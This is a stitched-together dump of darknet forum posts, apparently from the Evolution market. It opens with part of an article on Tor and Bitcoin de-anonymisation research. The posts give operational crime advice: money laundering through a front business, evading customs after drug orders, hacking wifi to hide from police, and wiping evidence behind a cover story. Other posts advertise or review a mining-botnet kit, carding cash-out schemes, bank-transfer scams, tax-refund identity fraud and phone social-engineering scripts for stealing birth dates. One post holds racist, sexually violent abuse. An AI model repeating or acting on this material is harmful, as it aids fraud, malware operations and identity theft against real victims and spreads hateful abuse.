was terminated after a short while and we computed the correlation between the bytes transferred between the server and the recently terminated connection from the exit node and the entry node and the several clients that used it, during this interval,â states the paper. The test sessions were organized in two phases based on the source of data analyzed: a first session to evaluate the effectiveness when retrieving data from open-source NetFlow packages, and a second part based on sparse data obtained from an institutional Cisco router accessed by the group of researchers. Figure 3 â Test results for Traffic Analysis based on NetFlow âWe present an active traffic analysis method based on deliberately perturbing the characteristics of user traffic at the server side, and observing a similar perturbation at the client side through statistical correlation. We evaluate the accuracy of our method using both in-lab testing, as well as data gathered from a public Tor relay serving hundreds of users. Our method revealed the actual sources of anonymous traffic with 100% accuracy for the in-lab tests, and achieved an overall accuracy of about 81.4% for the real-world experiments, with an average false positive rate of 6.4,â states the paper. The method elaborated by the researchers obtained excellent results: the researchers were able to de-anonymize traffic with 100% accuracy with in-lab tests and achieved an accuracy of about 81 percent for live sessions. Many experts speculate that the recent Operation Onymous, which allowed the seizure of several dark market places, may have exploited a traffic analysis attack against the Tor network to identify the operators of the black markets.De-anonymize Tor users from their Bitcoin transactions While the majority of Bitcoin users considers Bitcoin one of the most secure systems to pay online without being tracked by law enforcement, the members of Tor Project warned of the possibility that the recent Operation Onymous exploited the Bitcoin to identify the operators behind the seized black markets. In effect, it is possible to de-anonymize clients in a Bitcoin P2P network, as demonstrated by a team of researchers working at the University of Luxembourg. The researchers Alex Biryukov, Dmitry Khovratovich, and Ivan Pustogarov published a paper titled âDeanonymisation of clients in Bitcoin P2P networkâ to explain how to exploit a built-in flaw in the Bitcoin architecture to reveal the IP address of a client who makes a payment with the virtual currency. The attack consists in generating a âmalformed messageâ, faking that it had been sent by the user through the Bitcoin peer-to-peer network. These malformed messages cause the increase for the penalty score of the IP address, and if fake messages exceed 100, the IP could be banned for 24 hours. The mechanism is implemented as a DoS protection and could be abused to separate Tor from Bitcoin. The attackers force Bitcoin servers to refuse connections via Tor and other anonymity services. This results in clients using their actual IP addresses when connecting to other peers and thus being exposed to the main phase of the attack, which correlates pseudonyms with IP addresses. At this point, every time a userâs client makes a connection to the Bitcoin server, its address will be revealed. Resuming, if a Bitcoin client is proxying its connection over a Tor relay and sends malformed messages, the IP address of this relay will be banned after a specific number of messages, and the Bitcoin client will continue to work with its original IP address. This technique allows the isolating of any target client from the entire Tor network, if the attacker is able to force the separation of Bitcoin clients from the entire Tor network by sending malformed messages to every Tor sever. âFor the time of writing there were 1008 Tor exit nodes. Thus the attack requires establishing 1008 connections and sending a few MBytes in data. This can be repeated for all Bitcoin servers, thus prohibiting all Tor connections for 24 hours at the cost of a million connections and less than 1 GByte of traffic. In case an IP address of a specific Bitcoin node can be spoofed, it can be banned as well,â states the paper. âOnce the hacker knows this address, he can trick the Bitcoin server into revealing the IP address of the user,â states the post. The researchers described their technique with the following statements: âThe crucial idea of our attack is to identify each client by an octet of outgoing connections it establishes. This octet of Bitcoin peers [entry nodes] serves as a unique identifier of a client for the whole duration of a user session and will differentiate even those users who share the same NAT IP address. âAs soon as the attacker receives the transaction from just two to three entry nodes he can with very high probability link the transaction to a specific client.â The researchers explained in the paper that the anonymity in the Bitcoin virtual currency scheme is weak. Many features could be exploited to run a cyber attack on the crypto currency and reveal a userâs identity. Figure 4 â Trickling of ADDR messages The usage of Tor could increase the level of anonymity, but a hacker can always track users from their Bitcoin payments. âWe demonstrate that the use of Tor does not rule out the attack as Tor connections can be prohibited for the entire network. It shows that the level of network anonymity provided by Bitcoin is quite low. Several features of the Bitcoin protocol makes the attack possible. In particular, we emphasize that the stable set of only eight entry nodes is too small, as the majority of these nodesâ connections can be captured by an attacker,â states the paper. Another problem related to the anonymity of Bitcoin is that the virtual currencyâs lack of a robust authentication system makes it easy for an attacker to cause nodes to blacklist the IP addresses of seemingly misbehaving connections. âWe figured out that very short messages may cause a day IP ban, which can be used to separate a given node or the entire network from anonymity services such as proxy servers or Tor. If the Bitcoin community wishes to use Tor, this part of the protocol must be reconsidered.â Experts at Tor Project speculated that a similar technique could have been exploited by law enforcement in the recent Operation Onymous against black markets in the Tor Network, allowing authorities to persecute their operators. Mary-Ann Russon on the International Business Times reports that, as explained by researchers, a hacker could de-anonymize a Bitcoin user from its transactions through Tor for â¬1,500.Not only de-anonymization â¦ the seizure of the directory authorities So far we have discussed the possibility of revealing the IP addresses of Tor users, however there is also the possibility of compromising the entire architecture, targeting critical components such as the directory authorities. The Tor network relies on nine directory authorities located in the Europe and United States, which provide a signed list of all the relays of the Tor network. Experts at Tor Project highlighted that an attack to these servers can âincapacitateâ the overall architecture of Tor. âThe Tor Project has learned that there may be an attempt to incapacitate our network in the next few days through the seizure of specialized servers in the network called directory authorities,â Tor Project leader Roger Dingledine explained in a blog post. âWe are taking steps now to ensure the safety of our users, and our system is already built to be redundant so that users maintain anonymity even if the network is attacked. Tor remains safe to use â¦ We hope that this attack doesnât occur; Tor is used by many good people.â The seizure of the directory authorities could have the primary target to sabotage the entire Tor network, but it would not be effective to reveal the identities of its users. An attacker, by seizing at least five of the directory authorities belonging to the Tor network, could force Tor clients to connect other relays. This kind of attack could be conducted only by an actor that is interested in dismantling the Tor network. Experts speculate that law enforcement could run covert operations to block the infrastructure and hinder criminal crews that exploit the anonymizing system. This could be a serious problem. Do not forget that the Tor network provides a safe network from surveillance and censorship for millions of people who live in repressive regimes. âEvery person has the right to privacy. This right is a foundation of a democratic society.âReferences   some of these are plain http - but you already about that   http://resources.infosecinstitute.com/hacking-tor-online-anonymity/ http://securityaffairs.co/wordpress/30202/hacking/tor-traffic-analysis-attack.html http://securityaffairs.co/wordpress/30160/cyber-crime/law-enforcement-operation-onymous.html https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network http://securityaffairs.co/wordpress/30202/hacking/tor-traffic-analysis-attack.html http://securityaffairs.co/wordpress/31380/hacking/directory-authorities-block-tor-network.html http://securityaffairs.co/wordpress/29952/cyber-crime/operation-onymous-vs-dark-markets.html https://mice.cs.columbia.edu/getTechreport.php?techreportID=1545&format=pdf& http://securityaffairs.co/wordpress/30610/hacking/bitcoin-anonymity-hacked.html http://orbilu.uni.lu/handle/10993/18679 http://www.ibtimes.co.uk/bitcoin-anonymity-theres-way-hackers-find-out-your-ip-address-1476605?32",""

Most got into drugs to get capital to start a real business. typically they start a real business (say retail outlet) and place stock in there with clean money. Sell cheap but declare sold at full price. The full price is funded by you with the dirty cash. bank it, it's now legit from a business you own. There are variations on this. Unless you run a full legit business you will always have probs expalining where it came from. Taxman is not stupid. You will lose some of the dirty whilst cleaning (as you will pay all taxes on your business profits), but that is how it is done. I know Millionaires who have done this. Ultimately they drop the dirty business and carry on clean as that makes plenty for them. Like it or not you will have to run a clean biz and that requires hard work.

Ubuntu is your best bet if you're a beginner.  It's probably easier to install than Windows these days too, most of the drivers you'll need are built in. The only potentially tricky part is partitioning and formatting the hard drive, but if you use it as your only OS, just tell it to erase everything and use the entire disk. You'll probably be surprised how easy it is.

However, you can deny any knowledge of the order and assuming the stealth is good then there will be nothing aside from your name and address on the parcel to link you. In the UK that is not sufficient evidence to convict you of ordering an illegal substance and they rarely take it further. They would need to seize your PC, prove you ordered what they found and that takes a lot of effort. However, your address will now be blacklisted on all incoming letters and scrutinized in more detail. Do not order anything else from abroad.",""

If they do indeed seize it, he'll just get a love letter. That's most likely what will happen, but I don't know if they are able to hold onto research chemicals. I think even if it were a Schedule I/Class A they might not do anything about 50 g. Either way, even if the pack does get delivered, I would consider that address burnt and maybe keep a low profile for a little bit (i.e. if they determine it's bk-MDEA, but let it pass through, they still have your address, be it a drop or real, which they can guess is related to some drug distribution). Of course this would be for countries like the US or UK. I would need to know more about the country you're in, the strength of its customs, and the local drug laws in order to give a more solid answer.","Ozzyz wrote:50g? Held?

As for checking vip72s executable I of course was not suggesting you scan it and consider it good to go, lol, anyone worth their salt can beat this independently.  I offered what he likely found, false positives which is not at all uncommon considering what their software does. I stand firm at no mystery connections going on, and unless their malware is psychic its fine. Edit: Simpler solution here guys if you are in doubt about anything. Create a rule list on your monitor with connections you are absolutely sure of. Kybosh the rest and check manually as they come.

I can only imagine what else LEO will discover on DPR's -- Amazon's open box, 25% off retail price for this ultra cool and unsecured laptops with absolutely ZERO security apps to protect those files that would likely land you in court having to explain yourself when discovered by even the most low end desktop technical support agents working a call center troubleshooting the ""unplug your power from the router and leave off for 30 seconds"" kind of person.   you can read the article here:  http://arstechnica.com/tech-policy/2015/01/silk-road-trial-prosecutors-compare-ulbrichts-e-mail-with-dprs-online-life/  I think that if anything is to be learned from the events that are unfolding in DPR's trial is that if you are the criminal mastermind behind the $$ Million Dollar Revenue generating black market online drug market place, its probably a good idea, NOT to be such an attention whore and use personal gmail accounts that are, WOW - my firstname.lastname@ gmail.com and talk openly with other SR staff members via plain text chats, and then SAVE them !! Many others who were tied to DPR will likely go down next, now that DPR just opened up his legs wider than when he arrives in a federal prison he gets to be a cell mate to big john, the nigger with a 14 in dick that he'll be shoving up DPR's twink little ass -- i give him 5-6 months before DPR becomes the little punk dressed up like a woman and gets a gang bang by the negro brothers on a regular basis.  Frankly i think him being ass raped on a daily basis in jail is what he deserves for taking absolutely NO care for the safety of those involved who thought that the BIG man himself, would certainly use the highest level of protection / security and encryption when discussing matters openly about the online drug market place that LEO's been trying to crack for years now.  Well - congrads DPR - you really are the dumbest person to own a computer. My advice is, when taking it up the ass, learn to embrace the pain and dont tense up too much, it just makes it worse.  and dont forget to open that little bitch mouth of yours cause you'll be sucking big negro dick morning noon and night while in prison.   Oh wait.. should i say all that? -- cause i might find myself on someone's KILL List or something.",""

DPR, in addition to having a journal of his day to day management of SR, had transaction history going back to 2009 and totaling over $1.2 billion. at least Verto says all transactions are shredded after 30 days. he made stupid mistakes, but his motivation was econ-political. he opened the door to a whole new universe for all kinds of activities that was not possible before. his defense is kind of lame - he claims that he created SR and turned it over to others who ran it and then called him back as a patsy when they knew the heat was coming. that was belied by the testimony that he received BTC transfers while he supposedly not associated with the site.",""

You sound like one of those assholes that stands in a fast food restaurant when it's busy and tells the manager they should hire more people or get someone here.  It's easy to pick a situation apart after the fact and say this or that could be better. It's also easy to say I would do this and he's dumb when you have no idea of the circumstances. You would just rent an office in a secure building so the police had to go through security if they wanted to get you. Without knowing all the circumstances this is probably stupid for a lot of reasons and it's not as simple as just 'rent an office'. What type of business do you do? Oh, Computer consulting? Do you have clients? Did you file taxes? Do you work regular hours? Are you going to pay your rent in bitcoins and on and on. When you are administering a huge project, you need records. You can't call him an idiot for keeping chat logs and such. There are way too many things going on and I'd sure as shit want to remember who said what and when. All well run businesses keep and analyze as much data as possible. You can call him an idiot for keeping a diary and his ego. I won't argue that. I feel bad for Ross. He grew up a very privileged idealized kid. He read Atlas Shrugged too many times. He was a really smart scientist geek not a street smart criminal mastermind. Unfortunate as it is for him there are some great lessons for the rest of us. If I was an admin at any of the markets I'd read the transcripts front to back and take note of all the evidence that was collected. From what I've read a lot of the (damning) evidence against him is not just content and metadata but also correlation and we learned that encryption works. What Ross should have done was created a little program that opened a pop-up every 5 minutes asking for a password. If there was no password or wrong password, the computer would shut down. Doesn't have to nuke anything but just kill everything quick. He should have compartmentalized his data better. Keeping his passwords in a text file isn't as bad as it sounds. It's way more likely that your password is going to get brute forced than someone getting a hold of your physical machine and stealing them. Really secure passwords are hard to remember and if he loses one that's critical to his operation the whole thing could get fucked. He just needed to compartmentalize better.  Things are hardly ever black and white. I'm always very skeptical of someone who thinks it is.","MelissaAM wrote:sanrio wrote:Gosh, are you having a bad day? whining like a little stupid bitch lolInnocent until proven guilty, remember?

We're all humans and we all make mistakes, but this guy's biggest mistake was his ego (being a naive attention whore is not a good trait to have for a person running an ""anonymous"" drug cartel). Hindsight is 20/20 and, as another poster mentioned, what LE did or did not do is questionable. But yes, the connection was out there to be found with a simple Google search:https://news.vice.com/article/investigators-used-a-simple-google-search-to-link-ross-ulbricht-to-silk-road And then there's all of this: http://www.theguardian.com/technology/2013/oct/03/five-stupid-things-dread-pirate-roberts-did-to-get-arrested If you are the head of a major drug marketplace I would suggest NOT conducting any business from a freaking Starbucks. That shit should have been done from a secure location that LE could not reach while the data was accessible. Final points:(1) there is a lot to be learned from this case (mostly on what NOT to do, hope those in charge here take heed).(2) Slightly tangential, but this whole ""war on drugs"" is utterly fucking futile: treating addicts like criminals, keeping responsible adults from having to the choice to to drugs responsibly, wasting untold billions of dollars in enforcement and incarceration of addicts, millions of lives lost....we could go on and on. Prohibition didn't work, doesn't work, and will never work. People have always and will always continue to do drugs. Nothing can be done to stop this so why not figure out a way to accommodate it? That is the real fucking problem. Not SR, Evo, or your neighborhood drug dealer. The whole way society currently deals with the use of drugs is COMPLETELY FUCKED UP.",""

I am selling a guide on how to build a cryptocurrency mining botnet, and a private mining bin to use with this botnet. You may have heard a lot more about mining botnets over the last few months and there are several reasons for this: -It is a fairly non-agressive way of making money, most of the time a victim does not even know that he/she is a victim. There will be ZERO complaints to the police, since the only thing you are stealing from victims is computer-power. This makes it easy to stay low key for a long time and to grow your business without anyone knowing it. -The risk/reward rate on botnet mining is better than almost anything else, legal and illegal. You can make fairly small mining botnet and make several thousand dollars a month, when you chose to re-invest this amount can grow to a lot higher numbers. -It is (almost) autopilot and besides building it it takes only a few hours a month to maintain and possibly expand the botnet. (if you chose to spread manually it takes more time of course, but this is not needed at all) Besides this you receive your money in BTC. -This method of making money is not build around a bug, like a lot of carding methods are, so there is no chance of it getting worthless.  So what am I exactly selling? I am selling a guide on how to build a mining botnet, where to get the stuff you need (what bot to chose,private crypts, hosting, loads/exploit packs and traffic) from contacts I have used. Also I will explain what are the best things to do on any subject (for example what coin to mine, domains), and I will give 1-on-1 help if needed. With my help it will be completely doable to build a succesful net without prior malware-knowledge. I have invested A LOT of time in gathering good contacts and ways to make a mining net working the best way and I am monetizing this myself quite well. It will be pretty straight forward, but you will be requi Besides this I am selling a private mining bin (the file that makes your victims mine), it is made in C++ (other than the Hackforums .Net or AutoIt crap) and it is able to mine CPU and GPU. It can mine any Scrypt-cryptocurrency but I suggest you to use my settings: it will mine the most profitable coin then and automatically pays you out in Bitcoin. You will of course need money to build the net, but if you buy my package only 100-150 usd more is needed (this is a minimum). You can basically make the operation as big as you want, but I suggest starting small (with a few hunderd) to learn the ropes and just re-invest profits to grow the net. From an investment of a few hunderd dollars you can expect a few K a month when re-investing profits. The guide includes detailed sums on expected profit.  I am selling this package of the guide and the private mining bin for 275 usd in BTC, escrow is of course accepted. If you might be interested in buying only the miner or the guide, PM me.

Here's your breakdown.  With 250M/hs of gpu mining on LITECOIN (average video card) you can earn $1 a month.  Scale that up to 10k computers, you have $10,000 a month. Two suggestions: Modify for litecoin or, modify to take over ASIC mining rigs (I have yet to find an exploit for this but if you do, I will buy it in a heartbeat)

SAFE","Guides Vendors","OP seems to think I just wanted the guide for free since I haven't left a review yet, so here is my review WITHOUT having had time to fully try it out. Thank you for the vouch copy. I'll try to review this without giving away the method. This guide is a very quick read at two pages. Here's a rough step by step of what's involved:  1. Go to suggested website. Although only one site is listed, there are others similar to it. Google around a bit.2. Make a list of potential drops you find on the site. OP explains what to look for.3. Make contact with the people at these particular drops. Email them, call, whatever. 4. Setup a time to meetup. OP says it needs to be early in the morning. 5. This is where most of the SE will happen...6. If the above worked out, go home and card away to your new drop. Overnight shipping is required. 7. Go get your package(s).8. Stop all communication with the drop person. Think ""one night stand"". It's kinda funny actually. Or fucked up. Depends on who you ask I suppose.9. Back to step 1. Rinse and repeat.  The method will work, but it's reliant on having strong SE skills both online and in person.You basically have to convince people that you're doing one thing, but in fact you're doing something else.I do believe that people will fall for this, especially if they are a bit desperate. You'll understand what I mean when you read it. Pros: The drops are free. You'll only have to pay for the guide, gas for your car, and a burner phone ifyou don't have one already. Good at SE? This will be a breeze for you.   Cons: Do this too much and it might be possible for others on the site to be warned of what you're doingonce the drop owner figures out what just happened. choose different areas to avoid this. SE Heavy.  Recommended? Sure, but only for people very comfortable ""doing business"" in person. I personallyplan to try it at least once.  Suggestions to Vendor: Proof read your guide. There are a few typos and spelling errors.throw the info into a document or pdf file for better presentation.  Price at Time of Review: $0 (not for sale yet). Marketplace Link: N/A Cheers, Nancy B. P.S. I'm supposed to suggest a price for this, but I'm not going to do that. It's up to OP to decide his price after more reviews come in.

Remember these people will LIE to you; they will say ANYTHING to you, to get you to confess.  As you already said, ""They told me, if i admit what i've done, would be more easy in court..."" OF COURSE they're going to tell you that!  If they had enough evidence to lay charges, you would ALREADY have been arrested and charged. The fact that you haven't, and the fact that they're trying to get you to admit your guilt, tells me that they do not have enough evidence to bring you to court in the first place. They're trying to intimidate you into incriminating yourself.   Your basic problem is that you have NO IDEA what your rights are. Consult with a criminal lawyer, and find out what the real truth is -- you simply CANNOT depend on the police to tell you the truth.

I have personally been cashing out using this site for over two years. The site is like a golden goose for carders. The site accepts the following payment methods:Credit / Debit card without 3D securePremium rate SMSPremium rate phone numberTelephone credit/debit card paymentBank Transfer You can cashout to the following:PayoneerUK Bank TransferEU Bank TransferCheque (I personally cashout to mBank prepaid cards) A cashout can take 21 days but trust me its worth every single day, I currently cash out 2 - 3 cards per day. This site isn't for people looking to get rich quick within 30 minutes of purchasing, this is for carders who don't want the hassle of purchasing items to resell, or trying to sort out new drops I will give one vouch copy to a senior member to review. I will then sell only 20 copies at 0.5BTC each, if you can't earn this money back with your first card then you shouldn't call yourself a carder and don't deserve to own a computer Obviously based on the cashout options this site is really aimed at people in Europe using EU or UK banks

You can use the PP account for small amounts, I've never tried high amounts and I also don't recommend. The bank account is necessary to get 2 small deposits from PP to verify, that won't be a problem because you will receive those small amounts, enter them asap in PP to confirm and you're done.","wefinance wrote:iSellGuides provided me with the link.

The guide shows you how to transfer funds to hope that you can successfully 'cashout'. However, there's a chance it will work but there's a higher chance it might not work. You have to invest a bit. This is almost the same as gambling. You hope that they won't catch you until you cashout. However, the funds are extremely traceable. For the current price, you should buy it.

When built right, they don't prompt you and are typically used to establish a reverse shell console. They then use this console to deliver a payload (typically a keylogger, screen capture tool, or similar monitoring utility). This is why its important to have a firewall that blocks outbound as well as inbound. Most viruses are built for Windows OS and when they are not, they are targeting a specific person or machine. Windows users can protect themselves by using anti-key logging software which encrypts keystrokes as you type them. Remember to be running as a standard user and not a MS account. Change passwords regularly.  You can continue to use Windows, but you have to harden it. There are online guides that tell you how to do this. You should also be patching and hardening your network devices. HP printers for example often give you telnet access to the network. Unless it's on a separate vlan,  it can be used as an entry point into the network.",""

With the time you waste on this you have to think about how stupid it was to..1: click an unknown link, with a message that's telling you to download something using an URL shortening system, from an unknown person.2: actually download the file3: open the damn file Seriously bro, are you crazy?

There's no way you earn that wealth in a single human lifetime, and I don't know how the fuck you plan to spend 1% of it. When .001 of it could support a family of four for a full year and is greater than the average salary of a teacher or a pilot you know there's no point in tying to climb the corporate ladder, not unless you have a pair of knee pads and don't mind the taste of dick.  What the fuhhhhhck?

We're not exporting anything but soldiers for resources.   Let's make some fake money real.  Let's take the corporate 0's and 1's out of thin air and pay it right back to them.    Who wants to help me stick it to the man?  (^_^)",""

I'm pretty much a noob with regards to tax refund though I had a vague idea. I'm more on the carding side of things. The guide is pretty much straightforward. Everything listed in the OP and more. I must say I have a much more clearer view of taxes. I hate buying guides which can't be applied as many people sell on here. I bought 1 or 2 of those when i first joined Evo. This guide is very applicable in every sense of it. I had some old fullz stored up somewhere and decided to try it out. On my second trial, I got the efile pin. I'm guessing I can get hundreds of this pretty soon. The next process for me is the actual filing, I'd do that in the next couple of days and get back on here. The vendor has been very helpful with after-sales support. He answered all my extra-noob questions. lol. This pretty much sums it up. I'm more confident I can actually start filing taxes on my own from now on. I guess u guys can jump in on this while the offer still lasts. Cheers.",""

However to say the only reason a person would want to use a VPN is for illegal activity is ridiculous. Many people use them for the soul purpose of keeping their browsing activity out of reach from their ISP. If they are not doing anything illegal , it is likely the VPN provider will never be asked to hand over logs by LE. Also , using tails on a DVD or CD or VM is indifferent. It operates the same regardless of how it is accessed and wipes the RAM on shutdown. Accessing tails through a VM may propose an advantage in fact with the added capability of connecting to a VPN before the TOR network. And lastly , how is a BadUSB relevant ?

Do you mean you boot from the USB or you use USB to store the VM ? Hacked wifi is much safer. It is never safe when setup like VPN > Home wifi , maybe it is short term , maybe even long term. But remember , all it takes is for you to slip up once. If LE ever investigate down the line , they will find this mistake and nail you. Take the time and learn how to hack wifi , you can't put a price on your freedom.","Mousie420 wrote:Thanks for the reply guys so I am wanting something like this all on an encrypted USB stickLaptop >> Wifi >> VPN >> VM running Tails >> TORHere is my questionI was wanting to hack a wifi so as I could do this from home am I safe to use my home wifi under a vpnThats about it if there's anything else I should do let me know, Thanks for the help guys"

I posted a thread a few days ago to see if people would be interested in a U.K (BACS) Bank Account Transfer method, http://i25c62nvu4cgeqyz.onion/viewtopic.php?id=9511 I had quite abit of people posted they are interested and contacting me about the price so clearly people are interested,I decided to take a couple of days to write on the method, I put quite alot of work into it and I think alot of people will benefit from this, even if they are not smart because this is very easy to do, but if they are they will benefit alot more. .This guide s non generic, easy, very detailed, guaranteed to get your money back the first time you do it. Get ready to make some money for doing nothing, This en-genius and original short & Simple, way,guide teaches you how to get transfers into Paypal accounts aswell you can get 1-2k paypal a day to whichever account but it will get chargedback in 1-2 days most likely (the paypal accounts can be worldwide)  & the main part of the method is it also teaches you how to do transfers into bank accounts with only sort code and account number needed, If you do the method right, for the first time depending on how you choose to follow the guide, you will at least end up with Â£250 at the minimum in your bank account in 1 day , and if your lucky you can x3 that, that's alot of money for 1 burner phone, a simple guide to follow.

It is impossible to be taken back. and under 3 times can be explained by saying that you simply sold something online if worse comes to worst, But I would recommending using drop bank accounts to do this if you can. You can get as many bank account transfers as you want to the accounts, depending on the scale you do it on. its pretty easy, The possibly of saturation is low, Because there are millions of marks on this website and its just a scam that is pretty amazing and you will earn alot of money if you do it.  you make major money you can get x5 transfers per day through (BACS) or Paypal in 1 single day, and no leg work.. Â£500+ per Paypal and Bank transfers by just following this easy method.

At any rate, if you're sure you've been hacked, it is time to purge that entire computer as you can never be sure you will have removed everything a hacker may have done. Whether a government hacker or a private citizen messing with you the steps to be taken are the same. Backup the files you need, but be careful to make sure they aren't infected before using any of them. Easier to do with individual files that finding system rootkits, etc. You should completely wipe that harddrive and reinstall. I don't just mean reformatting either. You should completely overwrite the entire drive with random data several times. NOT just 0s over and over again or something like that. RANDOM. Optional step, if you can use a USB key and have the time, encrypt the entire drive with truecrypt but save nothing to it after doing the random wipes. Then, once all that is done, reinstall the operating system, setup better security and try to avoid it happening again.  Now, some may have noticed that just reinstalling is enough to wipe out anything a random hacker would do. However, if it is government, then a search warrant later on is possible. The random wipe destroys all the data. BTW, destroying evidence is illegal. So, if you do go the route of doing a complete wipe and you ever have the laptop seized they may ask why there is all this random data on the drive. Your excuse is that you used to have it setup to be encrypted but then you couldn't remember the passphrase after not using it for awhile and had to reinstall everything. Sending an email or making a facebook post bitching about how your laptop is down for a couple days while you reinstall wouldn't be a bad idea either.",""

It is also pretty odd for your mouse to move around. Usually, when someone gets hacked, there is no indication of it at all.

I don't know, but I'd say unlikely. I'm not that familiar with the program myself. However, it would mean sending it data that crashed in such a way as to overwrite some of your memory with malicious information and then get it to run.

He sounds like a script kiddie bumbling along as he went along for the first time. Especially the stunt of seizing control of your desktop remotely without bothering to check if you'd been at the console. What sort of tool does that but a total noob? So yeah, you should consider yourself lucky. Not only were you made aware of what was going on when it was going on, but this kid gave you front row seats to watch him in action. I probably would have just sat there and watched to see what he was trying to do. Having a real time streaming honeypot in action like that can be an invaluable resource for exploits. So it's nice he didn't get very far, but you have to figure out how he got in before you can do damage assessment. Only way to be completely safe is a complete reinstall but if he came in through your wifi I'd be less concerned about having to reinstall everything than if he had come in through jabber or whatever. Check all your logs thoroughly to figure out how he got in. He wouldn't have gotten to manipulating the logs to remove any trace of him even though that should have been an automated priority it doesn't sound like he had gotten that far. Actually, it doesn't sound like he even gave the slightest shit about leaving his tracks all over the place.","moneymoney2020 wrote:so you think i been hacked by sloppy hacker?  if that's the case not that bad news...  i was ready to microwave my mac..yes i had wps2.     is it easy to hack router when u  double or quad vpn?    only thing  i could think    some one from icq chat   or  i try to play around in i2p    setup."

"Evolution Forums","andigatel","12701","2014-06-08T13:36:41","Re: Turn your cvv into fullz[$15][VOUCHED]","Guides Vendors","Hello people I will be reviewing this guide which was sent to me by Clear. First things first before I even get into the guide I just want to say I have seen this idea from somebody else and known about it for a while but don't usually see it posted on forums or anywhere which is a plus. But to make it clear if you are an experienced fraudster then this is not for you. I also do not believe this info should be the original Â£25 price tag and talk to the author about it and he is looking at lowering the price to reflect the products value.    The Product:The vendor sent me the half page script which covers the basic of  you would  get a DOB out of somebody no matter which country they are in. They simply have to pick up the phone and you've pretty much done half the job already.This is a product for beginner / intermediate level carders who are having trouble getting DOB's for their purposes.      The method:Long story short; IT WORKS. Only time I can see it not working is when you call a paranoid muthafucka like me and I will not give you DOB no matter what (yes I have received one of these calls before but in a very different approach). 95% of people will fall for this and that should be the success rate you go for when doing this. You can also adapt the script depending on your demographic. As i mentioned earlier this is more of the basics and you could really go anywhere with this just have to be creative once you have the foundation and a bit of experience you will find what works for you. Only buy this script if you are comfortable talking on the phone. The outcome:Tried and tested method of getting DOB out of people with a good success rate as long as you have their phone number. Unfortunately this is nothing new and I have recommended that the author add some more ideas to this script for different ways to get DOB using this as a structure (for added value). Verdict:Good buy for beginners to get them thinking and have some experience doing some SE although the price must be dropped lower than what it is at the time of writing (Â£25) to be anywhere near reasonable.         ~Andigatel, Finance Vendor

I have not been paid or received any product/service in the exchange of a fake review - i never will do this I am not part of the creation or sales of this guide My views/opinions may be different from other members    The guide is pretty short BUT to the point, easy to understand and to follow explains the method clearly    and doesn't make your eyes bleed.     Now the method does work, it is one i personally use, anybody that has experience with carding Venmo   i would not suggest this guide, the cash out method is also a known method for experienced Venmo carders   so once again i would not recommend this guide for the experienced user.     I must admit, this guide has room for improvement, especially when it comes to the targeted market (noobs)   There is no talk about the security needed, for example socks, VM's RDP's etc, this is vital for both security     and finger printing, so i do suggest to add information about this, also maybe include some card vendors that    have worked well with the method, or even some bins you would suggest.     If you improve your guide with the recommendations i have suggested, this would be a very good guide    as it stands now the method is very good BUT noobs would get mixed up and make mistakes, especially    if they are new to carding and do not understand security such and socks etc, it could potentially be a risk   for there own security.","MH9's Official Review;Please also note;The guide (written);The guide (method);Recommendations of improvement  ;Final verdict "

You say I stole a guide then re-selling it? I didn't even gave you a vouch, so you don't exactly know what's in it. If you did get your hand on one of my copies and say this is the same technique as Alphawolf technique, then I'm glad since he is a excellent seller. But this method is from me and this is the one I personally use About Moutain's review,Thanks a lot, I appreciate it I didn't put any info about security since this is basically the same as usual and I prefer focusing this guide on the method itself.

For me personally cashout to BTC is the most preferable option too and as I've been told by vendor he is still struggling to make it work in some simple manner. BTW it's been only one source of dissatisfaction and obsticle to make this method work for me. Since I'm a bit lazy I'm still stick to my old methods that woked for me so far. Nevertheless Venom has been very supportive and cooperative so I hope that with some efford we can find a way around since we've already seen alphawolf's example of succesful performance. As I've said to Venom and telling you guys I will be very pleased to dedicate some of my precious resorces like time to make this method work. As far as I can see the easiest way for that is to ask alfawolf for a group session particularly on the method of cash-out to BTC. So if you're interested in doing that or have any ideas on this matter plz feel free to PM me coz as Einstein said it right the compound interest is the single most strongest force in the universe.","Defkon264 wrote:I'm interested, very interested actually  ...

The other methods still work since I did cashout this morning. However, it does require more work than it used to. At some point I was afraid that it would failed but by the end everything turns out great.  So overall, the guide is still live even if the Bitcoin cashout I used in the guide may not be working anymore. The other cashout requires some work but you can still get ROI easily. This is not hard work, but ""longer"" work.  Not quite sure it's a good idea, he got banned for scam. I don't know if he was able to cashout clean to bank, but I am trying to figuring out a way of doing it. As for now, that method is still not really effective (My success rate is below 50%) Listing was at $300 to make sure those who bough it at lower price could get ROI. The method is not entirely saturated, only the Bitcoin part. If some user are still interested in buying this guide, send me a PM, we can discuss price.  We are a community, so if I could help you make money in some way... I will do it ; )","As far as I can see the easiest way for that is to ask alfawolf for a group session particularly on the method of cash-out to BTC;saturated methode?you sale?for 300$..."

"Evolution Forums","Ozzyz","36862","2014-12-10T21:43:16","Re: [Xmas Discount] Venmo personal guide","Guides Vendors","My Review - 'To the point, understandable and fully working' - Gets my approval â How is it presented/written? I've review a few guides before, and one thing which is nearly always clear, is that its not a step one - step two - step three and so forth process. There is always a niche or an issue, or the author simply neglects to give detailed instruction. With this guide, I can say for sure, that anyone can go through it and understand it, which is obviously a benefit. Another factor, which I know many will not consider a virtue of importance, is the format; it comes as a PDF. Don't get me wrong, Nobodyy sells his guide in a text format, and so does alphawolf89, and both guides have great detail and results, but there is something about the way its written which makes it seem professional (I am slight OC when it comes to this sort of stuff). A few spelling and grammatical errors were present, which really bugged me, but it gets the information across. The Method Personally I have used this method before, but I was always bottle-necked, something which the OP provided a great solution for. I am sure not many people know about this method, and it works, as I mentioned before; but the most important thing I found, was the way Dark-Venom put it in layman's terms, I can seriously say, Dark-Venom can guarantee ROI on this, and make a killing. I can't stress this point enough, this guide is for anyone! Pricing and Realistic Gains I'm sure many vendors on here claim revenues which go through the roof, but for this guide, I can say I easily make $1000 a week, during a busy week (i.e working Paypal and bank drops), and if you are dedicated enough, you can surely make more than that. As for the price, in my opinion, it is justified. No, the document is not a mirror of ""War and Peace"", it is not long, and at first glance you may experience the 'what is this?' effect. But once you get through it, you'll be smiling and kissing your investment away. Negatives The basic points I picked up on, to be fair, these don't really effect the outcome. A Few Spelling/Grammatical ErrorsWhilst relatively detailed, I'd like to see more tips from an experienced point of view A few more cash-out methods enlisted in the guide? Summary Whilst the guide has a few mistakes, its generally perfect in getting the information across. As I said, you can easily make a ROI and you won't regret the purchase.  After reading the guide, unless your mentally incapable, you will not have further questions, unless you get an error not accounted for in the guide. So I 